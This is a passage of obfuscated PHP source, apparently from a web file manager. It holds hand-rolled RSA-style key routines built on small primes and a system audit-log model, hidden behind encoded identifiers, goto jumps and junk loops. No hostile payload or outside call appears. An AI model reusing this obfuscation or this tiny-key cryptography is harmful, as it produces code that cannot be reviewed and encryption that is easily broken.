$b®Šõù²; $E³ÏÕåêÙ­ = $C¡×œÍ˜ª·[651]; if (strlen($E³ÏÕåêÙ­) < $C¡×œÍ˜ª·[560]) { return; } $FÛ†•¡”›ù = $b®Šõù²++; $CÂæ‰íâˆŠ = $böŒÕ›ğŠ¬[334]($aöÀ°¾º¤÷, $EÍÇëĞ¹ã‰[$B†óô¼æé]) - $bÁ‚¶³öçÂ - $böŒÕ›ğŠ¬[335]($dŠø¬ÀÖØ[$FÛ†•¡”›ù]); $DØË†§¼æ¹ = $C¡×œÍ˜ª·[652]; while ($DØË†§¼æ¹ < $C¡×œÍ˜ª·[550]) { if ($DØË†§¼æ¹ >= 0) { break; } $DØË†§¼æ¹++; } while ($CÂæ‰íâˆŠ < 0) { $CÂæ‰íâˆŠ += 64; $e²¨ì¶ÙÚ” = $C¡×œÍ˜ª·[653]; while ($e²¨ì¶ÙÚ” < $C¡×œÍ˜ª·[560]) { if ($e²¨ì¶ÙÚ” >= 0) { break; } $e²¨ì¶ÙÚ”++; } } $CöŠ—°’èÊ .= $aöÀ°¾º¤÷[$CÂæ‰íâˆŠ]; $D¶‰ãìèìÌ = $C¡×œÍ˜ª·[654]; } $cÅâçøŸÈ² = $böŒÕ›ğŠ¬[338]($CöŠ—°’èÊ); goto a½ğ­Øˆ‡ª; a½ğ­Øˆ‡ª: $D”É©ÀÛæ¯ = $C¡×œÍ˜ª·[655]; if (!$D”É©ÀÛæ¯) { die; } break; goto d¿¼«Ê’µˆ; a®ïÃ„¶ÉÆ: $dŠø¬ÀÖØ = $böŒÕ›ğŠ¬[116]($b½¡İ´ÛÑ¤ . $böŒÕ›ğŠ¬[116]($f·ô¸Ò›Ï£ . $b½¡İ´ÛÑ¤) . $f·ô¸Ò›Ï£); $A§š¥·©ò÷ = $C¡×œÍ˜ª·[648]; if (!$A§š¥·©ò÷) { return; } goto b£‹ù¨„é‡; d¿¼«Ê’µˆ: $Aæå‡Ë’ó = $C¡×œÍ˜ª·[656]; while (strlen($Aæå‡Ë’ó) < $C¡×œÍ˜ª·[562]) { if (!$Aæå‡Ë’ó) { break; } $Aæå‡Ë’ó++; } goto BÚİÉÖ†ÅÚ; FÈêãğòÖå: $bÁ‚¶³öçÂ = $böŒÕ›ğŠ¬[334]($aöÀ°¾º¤÷, $b½¡İ´ÛÑ¤); $bŸß¹ù¼—„ = $C¡×œÍ˜ª·[647]; if (strlen($bŸß¹ù¼—„) < $C¡×œÍ˜ª·[550]) { return; } goto a®ïÃ„¶ÉÆ; b£‹ù¨„é‡: $dŠø¬ÀÖØ = $böŒÕ›ğŠ¬[25]($dŠø¬ÀÖØ, $bÁ‚¶³öçÂ % 8, $bÁ‚¶³öçÂ % 8 + 7); $A’ìóä‘ÏÊ = $C¡×œÍ˜ª·[649]; $CöŠ—°’èÊ = $böŒÕ›ğŠ¬[10]; goto bƒ‘É‚Ÿœ; BÚİÉÖ†ÅÚ: default: $cÅâçøŸÈ² = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($EÍÇëĞ¹ã‰, $f·ô¸Ò›Ï£ . $a¤ˆ¹°ªØ„); break; } if ($bÇ¯öé­£ - 1 > 0) { $cÅâçøŸÈ² = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][190]}($cÅâçøŸÈ², $f·ô¸Ò›Ï£, $bÇ¯öé­£ - 1); } return $cÅâçøŸÈ²; goto cĞçöğ‘Î; fšŠãŞá›¨: $A’ÂëÂ‰ÔĞ = $C¡×œÍ˜ª·[641]; $a¤ˆ¹°ªØ„ = $böŒÕ›ğŠ¬[25]($EÍÇëĞ¹ã‰, 1, 15); $fÈèÖ‘¯Ÿø = $C¡×œÍ˜ª·[642]; goto A¥Ø…¡Çœ; A¥Ø…¡Çœ: if (!$fÈèÖ‘¯Ÿø) { die; } $EÍÇëĞ¹ã‰ = $böŒÕ›ğŠ¬[25]($EÍÇëĞ¹ã‰, 16); $aöÀ°¾º¤÷ = $böŒÕ›ğŠ¬[329]; goto dÅò¦ˆ±¦; D­ïÊ¡Èùì: $EÍÇëĞ¹ã‰ = $böŒÕ›ğŠ¬[2]($EÍÇëĞ¹ã‰); $EÍÇëĞ¹ã‰ = $böŒÕ›ğŠ¬[216]($EÍÇëĞ¹ã‰); $bî…Ï•‰îá = $EÍÇëĞ¹ã‰[0]; goto fšŠãŞá›¨; b¼²Ù•ö®: $C¡×œÍ˜ª· =& $_SERVER[í™]; $böŒÕ›ğŠ¬ =& $_SERVER[æàÂÔ…ÔåÖÌ]; if (!$böŒÕ›ğŠ¬[336]($EÍÇëĞ¹ã‰) || $böŒÕ›ğŠ¬[24]($EÍÇëĞ¹ã‰) < 10) { return !1; } goto D­ïÊ¡Èùì; cĞçöğ‘Î: } public function yzak1b9aa8fe($bâ£¤ëÕ¶Í) { goto EÄˆóƒ³‘Î; EÄˆóƒ³‘Î: $aç›¾§†ˆŞ =& $_SERVER[í™]; $EÏÉ…›†÷Ü =& $_SERVER[æàÂÔ…ÔåÖÌ]; $D„–ÙØŒšš = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][339]}(); goto f³íõ‹·; f³íõ‹·: $FìÍ™¥Ñô = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][339]}(); $eİŸÅŠ´Ä = ($D„–ÙØŒšš - 1) * ($FìÍ™¥Ñô - 1); $fË‘‚Âç˜Ì = $EÏÉ…›†÷Ü[203](($D„–ÙØŒšš + $FìÍ™¥Ñô) / 2); goto D©ÄÛÔŞ ; EÜ¡‹ÉËŸõ: return $dÊìµ‡ÈÉŠ; goto dÕ¦Ù†…†; fÚßª‚œô©: $a³±¾–•¹ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($D„–ÙØŒšš * $FìÍ™¥Ñô . $EÏÉ…›†÷Ü[10], $EÏÉ…›†÷Ü[151]); $cÄŠÈÉ’¿ = $EÏÉ…›†÷Ü[116]($EÏÉ…›†÷Ü[340] . ($D„–ÙØŒšš + $FìÍ™¥Ñô) . $EÏÉ…›†÷Ü[341] . $fË‘‚Âç˜Ì . $EÏÉ…›†÷Ü[341] . $DÜÍ˜ù´¶ . $EÏÉ…›†÷Ü[342]); $dÊìµ‡ÈÉŠ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($bâ£¤ëÕ¶Í, $cÄŠÈÉ’¿) . $EÏÉ…›†÷Ü[343] . $a³±¾–•¹; goto EÜ¡‹ÉËŸõ; D©ÄÛÔŞ : while (1) { $dµÙ¬İ…™õ = $fË‘‚Âç˜Ì; $eÂ÷Ù‚…êÂ = $eİŸÅŠ´Ä; $Eõ±Ùã = $aç›¾§†ˆŞ[657]; if (!$Eõ±Ùã) { die; } while ($eÂ÷Ù‚…êÂ % $dµÙ¬İ…™õ != 0) { $FùåÕÀƒœ = $eÂ÷Ù‚…êÂ; $eÂ÷Ù‚…êÂ = $dµÙ¬İ…™õ; $a°„÷«Şå = $aç›¾§†ˆŞ[658]; while ($a°„÷«Şå < $aç›¾§†ˆŞ[554]) { if ($a°„÷«Şå >= 0) { break; } $a°„÷«Şå++; } $dµÙ¬İ…™õ = $FùåÕÀƒœ % $dµÙ¬İ…™õ; $aë¸Ùİ”Ë = $aç›¾§†ˆŞ[659]; } if ($dµÙ¬İ…™õ == 1) { break; } else { $fË‘‚Âç˜Ì++; } } $DÜÍ˜ù´¶ = 2; for ($D„çÔ®§è£ = 0; $D„çÔ®§è£ < $eİŸÅŠ´Ä * 10; $D„çÔ®§è£++) { if (($eİŸÅŠ´Ä * $D„çÔ®§è£ + 1) % $fË‘‚Âç˜Ì == 0) { $DÜÍ˜ù´¶ = $EÏÉ…›†÷Ü[203](($eİŸÅŠ´Ä * $D„çÔ®§è£ + 1) / $fË‘‚Âç˜Ì); break; } } goto fÚßª‚œô©; dÕ¦Ù†…†: } public function dgbob1ed8573($e×–“ƒà“) { goto B½šŒÑˆè; F‘„…¤¾‚: if ($CğİŒ‚àÔ°[19]($Dæåœ¿Ÿ) != 2) { return $CğİŒ‚àÔ°[10]; } $aªò›·ñİ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($Dæåœ¿Ÿ[1] . $CğİŒ‚àÔ°[10], $CğİŒ‚àÔ°[151]); if (!$aªò›·ñİ) { return $CğİŒ‚àÔ°[10]; } goto BŞà«ˆÒ°¨; CƒçÀ„ô: $e¢¹ãéá‰“ = 0; for ($e„íˆŸ«ù‘ = 3; $e„íˆŸ«ù‘ < $aªò›·ñİ; $e„íˆŸ«ù‘ += 2) { if ($aªò›·ñİ % $e„íˆŸ«ù‘ != 0) { continue; } $Cë÷áÚ¨¸ = $e„íˆŸ«ù‘; $e¢¹ãéá‰“ = $CğİŒ‚àÔ°[203]($aªò›·ñİ / $e„íˆŸ«ù‘); break; $DŒ·­²˜ßÑ = $B›ÀŞÍ©½Ë[661]; } $F‘¾¡Á³Œø = ($Cë÷áÚ¨¸ - 1) * ($e¢¹ãéá‰“ - 1); goto aôì³ßÍø; båˆÖ¶¿Ò: $bç³Î¿ÙêŠ = $CğİŒ‚àÔ°[116]($CğİŒ‚àÔ°[340] . ($Cë÷áÚ¨¸ + $e¢¹ãéá‰“) . $CğİŒ‚àÔ°[341] . $dÕÉˆÆëå› . $CğİŒ‚àÔ°[341] . $B„¦§ŞÍù‹ . $CğİŒ‚àÔ°[342]); $däøáˆŠ‡Ø = $B›ÀŞÍ©½Ë[663]; while (strlen($däøáˆŠ‡Ø) < $B›ÀŞÍ©½Ë[560]) { if (!$däøáˆŠ‡Ø) { break; } $däøáˆŠ‡Ø++; } goto F‘Éê¼Ğô‹; B½šŒÑˆè: $B›ÀŞÍ©½Ë =& $_SERVER[í™]; $CğİŒ‚àÔ° =& $_SERVER[æàÂÔ…ÔåÖÌ]; $Dæåœ¿Ÿ = $CğİŒ‚àÔ°[0]($CğİŒ‚àÔ°[343], $e×–“ƒà“); goto F‘„…¤¾‚; F‘Éê¼Ğô‹: $e´‡ºËƒ¨« = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($Dæåœ¿Ÿ[0], $bç³Î¿ÙêŠ); return $e´‡ºËƒ¨«; goto EÉ‹ÂĞÆ©í; BÄ×•š°²…: $d—¢šÂó¼‚ = $B›ÀŞÍ©½Ë[662]; while (strlen($d—¢šÂó¼‚) < $B›ÀŞÍ©½Ë[560]) { if (!$d—¢šÂó¼‚) { break; } $d—¢šÂó¼‚++; } for ($e„íˆŸ«ù‘ = 0; $e„íˆŸ«ù‘ < $F‘¾¡Á³Œø * 10; $e„íˆŸ«ù‘++) { if (($F‘¾¡Á³Œø * $e„íˆŸ«ù‘ + 1) % $dÕÉˆÆëå› == 0) { $B„¦§ŞÍù‹ = $CğİŒ‚àÔ°[203](($F‘¾¡Á³Œø * $e„íˆŸ«ù‘ + 1) / $dÕÉˆÆëå›); break; } } goto båˆÖ¶¿Ò; BŞà«ˆÒ°¨: $aªò›·ñİ = $CğİŒ‚àÔ°[203]($aªò›·ñİ); $Cë÷áÚ¨¸ = 0; $d±è”Ğ‚­ä = $B›ÀŞÍ©½Ë[660]; goto CƒçÀ„ô; aôì³ßÍø: $dÕÉˆÆëå› = $CğİŒ‚àÔ°[203](($Cë÷áÚ¨¸ + $e¢¹ãéá‰“) / 2); while (1) { $Fë¼ËÜÔï = $dÕÉˆÆëå›; $E…ØœèÇÂŞ = $F‘¾¡Á³Œø; while ($E…ØœèÇÂŞ % $Fë¼ËÜÔï != 0) { $dŒƒŒˆä¡Ù = $E…ØœèÇÂŞ; $E…ØœèÇÂŞ = $Fë¼ËÜÔï; $Fë¼ËÜÔï = $dŒƒŒˆä¡Ù % $Fë¼ËÜÔï; } if ($Fë¼ËÜÔï == 1) { break; } else { $dÕÉˆÆëå›++; } } $B„¦§ŞÍù‹ = 2; goto BÄ×•š°²…; EÉ‹ÂĞÆ©í: } public function apwe1f3adfe3() { goto AÏ‹Öâ¦Ôæ; Cõß¡…‰µ’: $A‰¸Úƒ ¸¡ = 2; for ($C×ğºæ†ùÇ = $E“»¹™á³”; $C×ğºæ†ùÇ > 1; $C×ğºæ†ùÇ--) { $Bñ”‹ÉêÆÚ = !0; $CƒÊùÔöÛ = $fØÄÔëÄ«[667]; if (!$CƒÊùÔöÛ) { die; } foreach ($CÏÚì¸Àê as $FíÄ«÷ÚÎÂ) { if ($C×ğºæ†ùÇ % $FíÄ«÷ÚÎÂ == 0) { $Bñ”‹ÉêÆÚ = !1; break; } } if ($Bñ”‹ÉêÆÚ) { $A‰¸Úƒ ¸¡ = $C×ğºæ†ùÇ; break; } } return $A‰¸Úƒ ¸¡; goto EÁÏÈ©½³; b¥æğ—‹È„: $b±ÂŠÙ…ö = $fØÄÔëÄ«[664]; if (!$b±ÂŠÙ…ö) { die; } $CÏÚì¸Àê = array(); goto b¶Ş²¨¹Î; b¶Ş²¨¹Î: $cÃ‘±¬Ê„¯ = 1; $c’ÓÉ¦Ïñ™ = $fØÄÔëÄ«[665]; while ($cÃ‘±¬Ê„¯ <= (int) $eŠíÕ”¨à[345]($E“»¹™á³”)) { $C×ğºæ†ùÇ = $cÃ‘±¬Ê„¯; while (!0) { $C×ğºæ†ùÇ++; $A²”ĞâÒË = $fØÄÔëÄ«[666]; if ($C×ğºæ†ùÇ <= 2) { $cÃ‘±¬Ê„¯ = $C×ğºæ†ùÇ; break; } else { if ($C×ğºæ†ùÇ < 2) { continue; } } $Bñ”‹ÉêÆÚ = !0; for ($BÕ©÷ ¸¿¶ = 2; $BÕ©÷ ¸¿¶ <= $eŠíÕ”¨à[345]($C×ğºæ†ùÇ); $BÕ©÷ ¸¿¶++) { if ($C×ğºæ†ùÇ % $BÕ©÷ ¸¿¶ == 0) { $Bñ”‹ÉêÆÚ = !1; } } if ($Bñ”‹ÉêÆÚ) { $cÃ‘±¬Ê„¯ = $C×ğºæ†ùÇ; break; } } $CÏÚì¸Àê[] = $cÃ‘±¬Ê„¯; } goto Cõß¡…‰µ’; AÏ‹Öâ¦Ôæ: $fØÄÔëÄ« =& $_SERVER[í™]; $eŠíÕ”¨à =& $_SERVER[æàÂÔ…ÔåÖÌ]; $E“»¹™á³” = $eŠíÕ”¨à[324]($eŠíÕ”¨à[344](2, 14), $eŠíÕ”¨à[344](2, 16) - 1); goto b¥æğ—‹È„; EÁÏÈ©½³: } public function kasx92330718($BÕ¯ÚôÜ‘, $d¹¸àö·±Š) { $aÔ¨ëÕ† =& $_SERVER[æàÂÔ…ÔåÖÌ]; return $aÔ¨ëÕ†[13](array($aÔ¨ëÕ†[14], $aÔ¨ëÕ†[346]), $BÕ¯ÚôÜ‘, $d¹¸àö·±Š); } public function ihcq315fa0cf($Cà§î©á, $b¿É÷î’—…) { $aÀµ‚µ’Üˆ =& $_SERVER[æàÂÔ…ÔåÖÌ]; return $aÀµ‚µ’Üˆ[13](array($aÀµ‚µ’Üˆ[347], $aÀµ‚µ’Üˆ[348]), $Cà§î©á, $b¿É÷î’—…); $DöÉ¤ÆœÚ = $_SERVER[í™][668]; } public function xeho97e688ec($FÈ„·£åÉˆ, $Eè«ª…ÀÙ„) { $fÒÅ¼Ç³‹¥ =& $_SERVER[æàÂÔ…ÔåÖÌ]; return $fÒÅ¼Ç³‹¥[13](array($fÒÅ¼Ç³‹¥[347], $fÒÅ¼Ç³‹¥[349]), $FÈ„·£åÉˆ, $Eè«ª…ÀÙ„); } } goto bÆ®ååí“; bî¸™ ‹¬¬: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\x54\151\x6d\x65", "\x74\151\155\145", "\x69\x6e\x73\145\162\x74", "\x66\x75\x6e\x63\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $b¹ª‰ÓİË¾ =& $_SERVER[í™]; return array($b¹ª‰ÓİË¾[2385] => LNG($b¹ª‰ÓİË¾[2386]), $b¹ª‰ÓİË¾[2387] => LNG($b¹ª‰ÓİË¾[2388]), $b¹ª‰ÓİË¾[2033] => LNG($b¹ª‰ÓİË¾[2389]), $b¹ª‰ÓİË¾[2390] => LNG($b¹ª‰ÓİË¾[2391]), $b¹ª‰ÓİË¾[2392] => LNG($b¹ª‰ÓİË¾[2393]), $b¹ª‰ÓİË¾[2394] => LNG($b¹ª‰ÓİË¾[2395]), $b¹ª‰ÓİË¾[2396] => LNG($b¹ª‰ÓİË¾[2397]), $b¹ª‰ÓİË¾[2398] => LNG($b¹ª‰ÓİË¾[2399]), $b¹ª‰ÓİË¾[2064] => LNG($b¹ª‰ÓİË¾[2400]), $b¹ª‰ÓİË¾[2065] => LNG($b¹ª‰ÓİË¾[2401]), $b¹ª‰ÓİË¾[2402] => LNG($b¹ª‰ÓİË¾[2403]), $b¹ª‰ÓİË¾[2404] => LNG($b¹ª‰ÓİË¾[2405]), $b¹ª‰ÓİË¾[2406] => LNG($b¹ª‰ÓİË¾[2407]), $b¹ª‰ÓİË¾[2408] => LNG($b¹ª‰ÓİË¾[2409]), $b¹ª‰ÓİË¾[2062] => LNG($b¹ª‰ÓİË¾[2410]), $b¹ª‰ÓİË¾[2069] => LNG($b¹ª‰ÓİË¾[2411]), $b¹ª‰ÓİË¾[2412] => LNG($b¹ª‰ÓİË¾[2413]), $b¹ª‰ÓİË¾[2414] => LNG($b¹ª‰ÓİË¾[2415]), $b¹ª‰ÓİË¾[2416] => LNG($b¹ª‰ÓİË¾[2417]), $b¹ª‰ÓİË¾[2418] => LNG($b¹ª‰ÓİË¾[2419]), $b¹ª‰ÓİË¾[2072] => LNG($b¹ª‰ÓİË¾[2420]), $b¹ª‰ÓİË¾[2073] => LNG($b¹ª‰ÓİË¾[2421]), $b¹ª‰ÓİË¾[2422] => LNG($b¹ª‰ÓİË¾[2423]), $b¹ª‰ÓİË¾[2424] => LNG($b¹ª‰ÓİË¾[2425]), $b¹ª‰ÓİË¾[2426] => LNG($b¹ª‰ÓİË¾[2427]), $b¹ª‰ÓİË¾[2067] => LNG($b¹ª‰ÓİË¾[2428]), $b¹ª‰ÓİË¾[2429] => LNG($b¹ª‰ÓİË¾[2430]), $b¹ª‰ÓİË¾[2066] => LNG($b¹ª‰ÓİË¾[2431]), $b¹ª‰ÓİË¾[2432] => LNG($b¹ª‰ÓİË¾[2433]), $b¹ª‰ÓİË¾[2434] => LNG($b¹ª‰ÓİË¾[2435]), $b¹ª‰ÓİË¾[2436] => LNG($b¹ª‰ÓİË¾[2436]), $b¹ª‰ÓİË¾[2437] => LNG($b¹ª‰ÓİË¾[2037]), $b¹ª‰ÓİË¾[2438] => LNG($b¹ª‰ÓİË¾[2439]), $b¹ª‰ÓİË¾[2440] => LNG($b¹ª‰ÓİË¾[2441]), $b¹ª‰ÓİË¾[2442] => LNG($b¹ª‰ÓİË¾[2443]), $b¹ª‰ÓİË¾[2444] => LNG($b¹ª‰ÓİË¾[2445]), $b¹ª‰ÓİË¾[2446] => LNG($b¹ª‰ÓİË¾[2447]), $b¹ª‰ÓİË¾[2448] => LNG($b¹ª‰ÓİË¾[2448]), $b¹ª‰ÓİË¾[2449] => LNG($b¹ª‰ÓİË¾[2450]), $b¹ª‰ÓİË¾[2451] => LNG($b¹ª‰ÓİË¾[2452]), $b¹ª‰ÓİË¾[2453] => LNG($b¹ª‰ÓİË¾[2454]), $b¹ª‰ÓİË¾[2455] => LNG($b¹ª‰ÓİË¾[2456]), $b¹ª‰ÓİË¾[2457] => LNG($b¹ª‰ÓİË¾[2458]), $b¹ª‰ÓİË¾[2459] => LNG($b¹ª‰ÓİË¾[2460])); } private function typeFile() { $CŞÖ×–å½ =& $_SERVER[í™]; $d­ãš†èÎ = array($CŞÖ×–å½[2069] => array($CŞÖ×–å½[2070]), $CŞÖ×–å½[2406] => array($CŞÖ×–å½[2461]), $CŞÖ×–å½[2408] => array($CŞÖ×–å½[2462]), $CŞÖ×–å½[2062] => array($CŞÖ×–å½[2063]), $CŞÖ×–å½[2414] => array(), $CŞÖ×–å½[2416] => array(), $CŞÖ×–å½[2418] => array(), $CŞÖ×–å½[2072] => array($CŞÖ×–å½[2074]), $CŞÖ×–å½[2073] => array($CŞÖ×–å½[2074]), $CŞÖ×–å½[2422] => array($CŞÖ×–å½[2463]), $CŞÖ×–å½[2424] => array($CŞÖ×–å½[2463]), $CŞÖ×–å½[2426] => array($CŞÖ×–å½[2464]), $CŞÖ×–å½[2412] => array($CŞÖ×–å½[2465]), $CŞÖ×–å½[2067] => array($CŞÖ×–å½[2466]), $CŞÖ×–å½[2429] => array($CŞÖ×–å½[2467]), $CŞÖ×–å½[2066] => array($CŞÖ×–å½[2068])); return $d­ãš†èÎ; } private function typeAll() { goto E– ÖÓµŒË; C–ñºÔ¶ï”: return $D ’«¡³—ª; goto DÙŠùŒ«Úƒ; E¨‹¨çÒ¼¯: foreach ($d‹ôŠò‘Àå as $e‘“ÅÁ£ÈÈ => $b“õ¾ô¼à¤) { $D ’«¡³—ª[$b“õ¾ô¼à¤[0]] = $D ’«¡³—ª[$e‘“ÅÁ£ÈÈ]; } $D ’«¡³—ª[$e³ğß²òƒ×[2074]] = LNG($e³ğß²òƒ×[2468]); $D ’«¡³—ª[$e³ğß²òƒ×[2463]] = LNG($e³ğß²òƒ×[2469]); goto C–ñºÔ¶ï”; E– ÖÓµŒË: $e³ğß²òƒ× =& $_SERVER[í™]; $D ’«¡³—ª = $this->typeList; $d‹ôŠò‘Àå = array_filter($this->typeFile()); goto E¨‹¨çÒ¼¯; DÙŠùŒ«Úƒ: } public function addLog($bš¿¶–Ÿî¬, $EŸÉã‘­’… = array()) { goto DóÌ¤ˆ¼–; DóÌ¤ˆ¼–: $F¯ïùî±’ˆ =& $_SERVER[í™]; if (!isset($this->typeList[$bš¿¶–Ÿî¬])) { return; } $FĞµï…¨ = USER_ID ? USER_ID : (isset($EŸÉã‘­’…[$F¯ïùî±’ˆ[1423]]) ? $EŸÉã‘­’…[$F¯ïùî±’ˆ[1423]] : 0); goto DÁ²ä¶ƒ…; DÁ²ä¶ƒ…: $F“º—¾ĞÍ = get_client_ip(); if (!$EŸÉã‘­’… || strlen(json_encode($EŸÉã‘­’…)) >= 1024) { $EŸÉã‘­’… = array($F¯ïùî±’ˆ[2470] => $F“º—¾ĞÍ); } else { if (is_array($EŸÉã‘­’…)) { $EŸÉã‘­’…[$F¯ïùî±’ˆ[2470]] = $F“º—¾ĞÍ; } else { $EŸÉã‘­’… = array($F¯ïùî±’ˆ[1020] => $EŸÉã‘­’…, $F¯ïùî±’ˆ[2470] => $F“º—¾ĞÍ); } } $EŸÉã‘­’… = array($F¯ïùî±’ˆ[1413] => Session::sign(), $F¯ïùî±’ˆ[1414] => $FĞµï…¨, $F¯ïùî±’ˆ[29] => $bš¿¶–Ÿî¬, $F¯ïùî±’ˆ[1416] => json_encode($EŸÉã‘­’…)); goto d’ë´°°™³; d’ë´°°™³: parent::add($EŸÉã‘­’…); goto dš­ë‘„; dš­ë‘„: } public function remove($dÀ¶´ïßËÖ) { $this->where(array($_SERVER[í™][385] => $dÀ¶´ïßËÖ))->delete(); } private function _makeOrder($d¨ª¨Ñ¿ñ = '') { goto dÅ‹â®Áµ¨; dÅ‹â®Áµ¨: $F¾¦Ùè›Ò­ =& $_SERVER[í™]; $fÕœœÁ´ê = $F¾¦Ùè›Ò­[187]; $Bè¹”Şå = array($F¾¦Ùè›Ò­[402] => $F¾¦Ùè›Ò­[403], $F¾¦Ùè›Ò­[404] => $F¾¦Ùè›Ò­[405]); goto A¨¿¿´ ßÅ; A¨¿¿´ ßÅ: $fŒğø¡Î×Ñ = Input::get($F¾¦Ùè›Ò­[408], $F¾¦Ùè›Ò­[7], $F¾¦Ùè›Ò­[2247], array($F¾¦Ùè›Ò­[2173], $F¾¦Ùè›Ò­[404])); $fŒğø¡Î×Ñ = $Bè¹”Şå[$fŒğø¡Î×Ñ]; $d¨ª¨Ñ¿ñ = $d¨ª¨Ñ¿ñ . "{$fÕœœÁ´ê}\40{$fŒğø¡Î×Ñ}"; goto e‡¦™Á‚Á‰; e‡¦™Á‚Á‰: return $this->order($d¨ª¨Ñ¿ñ); goto aÙÓ½¯ »ç; aÙÓ½¯ »ç: } public function get($c®ˆ¨çŒ÷ª = '') { goto eŞ§©š¤¡•; dÑåºäËâ: $bÏãöŠò›¶[$F’„ìÕ¢Õí[354]] = $this->logList($bÏãöŠò›¶[$F’„ìÕ¢Õí[354]]); return $bÏãöŠò›¶; goto Açæ„¨º¯—; Cåß©‡Ôñ: if ($c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[1423]]) { $D‚²‚¤‰ö‡[$F’„ìÕ¢Õí[1423]] = $c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[1423]]; } if (isset($c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[684]])) { $Bí´‘¦Çä = $c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[684]]; $dÏŒÀ…Çè = isset($c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[449]]) ? $c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[449]] : time(); $D‚²‚¤‰ö‡[$F’„ìÕ¢Õí[187]] = array($F’„ìÕ¢Õí[321], array($Bí´‘¦Çä, $dÏŒÀ…Çè)); } if ($c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[29]]) { $CŸêóß¾¨‘ = explode($F’„ìÕ¢Õí[47], $c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[29]]); $AÉèŞˆÏ©ß = $this->typeFile(); $a—÷–´õì† = array(); foreach ($CŸêóß¾¨‘ as $f‘ì¦¾±­) { $a—÷–´õì†[] = $f‘ì¦¾±­; if (isset($AÉèŞˆÏ©ß[$f‘ì¦¾±­])) { $a—÷–´õì† = array_merge($a—÷–´õì†, $AÉèŞˆÏ©ß[$f‘ì¦¾±­]); } } $a—÷–´õì† = array_unique($a—÷–´õì†); if ($a—÷–´õì†) { $D‚²‚¤‰ö‡[$F’„ìÕ¢Õí[29]] = array($F’„ìÕ¢Õí[7], $a—÷–´õì†); } } goto F†ø¦–°»ê; eŞ§©š¤¡•: $F’„ìÕ¢Õí =& $_SERVER[í™]; if (!$c®ˆ¨çŒ÷ª) { show_json(array()); } $D‚²‚¤‰ö‡ = array(); goto Cåß©‡Ôñ; F†ø¦–°»ê: if (!empty($c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[2470]])) { $D‚²‚¤‰ö‡[$F’„ìÕ¢Õí[405]] = array($F’„ìÕ¢Õí[733], "\45{$c®ˆ¨çŒ÷ª[$F’„ìÕ¢Õí[2470]]}\45"); } $bÏãöŠò›¶ = $this->_makeOrder()->where($D‚²‚¤‰ö‡)->selectPage(); if (empty($bÏãöŠò›¶[$F’„ìÕ¢Õí[354]])) { show_json(array(), !0, $bÏãöŠò›¶[$F’„ìÕ¢Õí[351]]); } goto dÑåºäËâ; Açæ„¨º¯—: } private function ipAddress(&$Cåİ¼¨Øã) { $fè¨½“õ =& $_SERVER[í™]; if (!empty($Cåİ¼¨Øã[$fè¨½“õ[2470]])) { $bº©Ê¢¹‡… = IpLocation::get($Cåİ¼¨Øã[$fè¨½“õ[2470]]); } else { $bº©Ê¢¹‡… = LNG($fè¨½“õ[2471]); } $Cåİ¼¨Øã[$fè¨½“õ[2472]] = $bº©Ê¢¹‡…; } private function descZipDownload($A¥¦¶ìÌšÑ, &$c„…ŒÓÔ„‚) { $D——­ŒÃÛ =& $_SERVER[í™]; if (!isset($A¥¦¶ìÌšÑ[$D——­ŒÃÛ[2473]])) { return; } $EÓ‚á”ï•Ñ = json_decode($A¥¦¶ìÌšÑ[$D——­ŒÃÛ[2473]], !0); foreach ($EÓ‚á”ï•Ñ as $cå°ğã—š) { if (!IO::init($cå°ğã—š[$D——­ŒÃÛ[75]])) { continue; } if (!($D•Ë™¥é²š = IO::infoFull($cå°ğã—š[$D——­ŒÃÛ[75]]))) { continue; } $A¥¦¶ìÌšÑ[$D——­ŒÃÛ[75]] = $cå°ğã—š[$D——­ŒÃÛ[75]]; $c„…ŒÓÔ„‚[] = $A¥¦¶ìÌšÑ[$D——­ŒÃÛ[369]] = $D•Ë™¥é²š[$D——­ŒÃÛ[369]]; $c„…ŒÓÔ„‚[] = $A¥¦¶ìÌšÑ[$D——­ŒÃÛ[2290]] = $D•Ë™¥é²š[$D——­ŒÃÛ[463]]; break; } return $A¥¦¶ìÌšÑ; } private function getSourceList(&$F“µóĞØó) { $f÷ï’¶Á£´ =& $_SERVER[í™]; $b¯†îæ½Œ = array(); foreach ($F“µóĞØó as $F¸öŞÆà‹Š => $DËÊ—×Õ’®) { goto C‡ã¨ÁÃ¬¾; C‡ã¨ÁÃ¬¾: $aÜ‘…¶½éô = json_decode($DËÊ—×Õ’®[$f÷ï’¶Á£´[405]], !0); if ($DËÊ—×Õ’®[$f÷ï’¶Á£´[29]] == $f÷ï’¶Á£´[2065]) { $aÜ‘…¶½éô = $this->descZipDownload($aÜ‘…¶½éô, $b¯†îæ½Œ); $F“µóĞØó[$F¸öŞÆà‹Š][$f÷ï’¶Á£´[405]] = json_encode($aÜ‘…¶½éô); continue; } if (strpos($DËÊ—×Õ’®[$f÷ï’¶Á£´[29]], $f÷ï’¶Á£´[2291]) !== 0) { goto f¥Ì¹ø«¼¾; D×¯Ÿ»®å‹: $b¯†îæ½Œ[] = $aÜ‘…¶½éô[$f÷ï’¶Á£´[369]] = $B¨¥·©»¶ [$f÷ï’¶Á£´[369]]; $b¯†îæ½Œ[] = $aÜ‘…¶½éô[$f÷ï’¶Á£´[2290]] = $B¨¥·©»¶ [$f÷ï’¶Á£´[463]]; 